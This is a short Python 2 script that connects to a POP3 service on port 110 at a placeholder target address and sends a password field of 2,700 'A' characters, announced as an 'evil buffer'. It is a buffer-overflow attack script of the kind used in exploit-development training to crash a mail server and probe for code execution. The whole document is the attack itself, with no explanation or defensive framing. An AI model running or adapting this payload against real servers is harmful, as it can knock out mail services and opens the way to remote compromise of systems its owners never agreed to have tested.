#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2700


try:
	print "\Sending evil buffer..."
	s.connect(('<TARGET_IP_ADDRESS>',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
